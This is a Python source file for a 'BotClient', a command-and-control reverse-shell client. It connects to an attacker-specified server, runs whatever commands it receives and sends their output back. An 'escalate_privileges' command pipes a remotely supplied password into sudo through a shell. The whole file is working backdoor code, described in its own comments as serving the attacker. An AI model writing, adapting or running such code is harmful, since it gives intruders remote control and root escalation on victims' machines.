import argparse
import sys
from subprocess import run
from socket import gaierror, socket, AF_INET, SOCK_STREAM
from termcolor import colored

default_port = 38433


class BotClient:
    def __init__(self, server_name=None, server_port=default_port):
        # get attackers IP address as the first command line parameter and set the port
        self.server_name = server_name
        self.server_port = server_port
        self.client_socket = socket(AF_INET, SOCK_STREAM)

    def connect(self):
        # connect the sockt using a tuple containing the sockets IP address and port
        try:
            self.client_socket.connect((self.server_name, self.server_port))
            print(
                colored(
                    f"You have successfully connected to the C2 server at {self.server_name}:{self.server_port}",
                    "green",
                    "on_grey",
                    ["bold"],
                )
            )
        except ConnectionRefusedError:
            print(
                colored(
                    f"Connection refused. Make sure the C2 server is listening on the specified port({self.server_port}).",
                    "red",
                    "on_grey",
                    ["bold"],
                )
            )
            exit()
        except gaierror as e:
            print(
                colored(
                    f"Error: Specified server ({self.server_name}) not found. Please check your spelling and try again.",
                    "red",
                    "on_grey",
                    ["bold"],
                )
            )
            exit()

    def send_message(self, message):
        self.client_socket.sendall(message.encode())

    def run(self):
        self.connect()
        command = (self.client_socket.recv(4064)).decode()

        # keep the port open for as long as the attacker doesn't exit the reverse shell
        while command != "exit":
            if command.strip() == "this_is_empty":
                # If the command is empty, send a message to the C2 server and wait for the next command
                self.client_socket.sendall("Empty command received".encode())
                command = (self.client_socket.recv(4064)).decode()
                continue
            try:
                if "escalate_privileges" == command.lower().strip():
                    # execute the command then send a message asking for the password befoe executing the command
                    self.client_socket.sendall("needpass".encode())
                    password = (self.client_socket.recv(4064)).decode()
                    # concatenate the password and the actual command
                    command = f"echo {password} | sudo -S whoami > whoami.txt"

                    # Execute the command in a shell context
                    run(command, shell=True)

                    continue

                # create a subprocess using the run method and pass the command to the subprocess
                result = run(command.split(" "), capture_output=True)

                # get the result and error output from the completed process
                output = result.stdout
                error = result.stderr

                # check for empty output or error
                if not output and not error:
                    output = f"command {command} executed successfully with no output".encode()

                # send the result to the attacker's machine
                self.client_socket.sendall(output)
                self.client_socket.sendall(error)
            except Exception as e:
                # handle the FileNotFoundError
                error_message = str(e).encode()
                self.client_socket.sendall(error_message)

            # recieve the next command
            command = (self.client_socket.recv(4064)).decode()

        print(colored("C2 server shutdown. Exiting...", "red", "on_black", ["bold"]))
        self.client_socket.close()
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="Bot Client")
    parser.add_argument("--server", type=str, required=True, help="Server address")
    parser.add_argument(
        "--port", type=int, default=default_port, help="Port number (optional)"
    )
    args = parser.parse_args()

    bot = BotClient(args.server, args.port)
    try:
        bot.run()
    except BrokenPipeError:
        print(
            colored(
                "Connection to server lost. Exiting...", "red", "on_black", ["bold"]
            )
        )
        sys.exit(1)
    except KeyboardInterrupt:
        # handle a Keyboard Interrupt (Ctrl+C)
        print("Keyboard Interrupt. Closing Bot Client...")
        sys.exit(1)


if __name__ == "__main__":
    main()
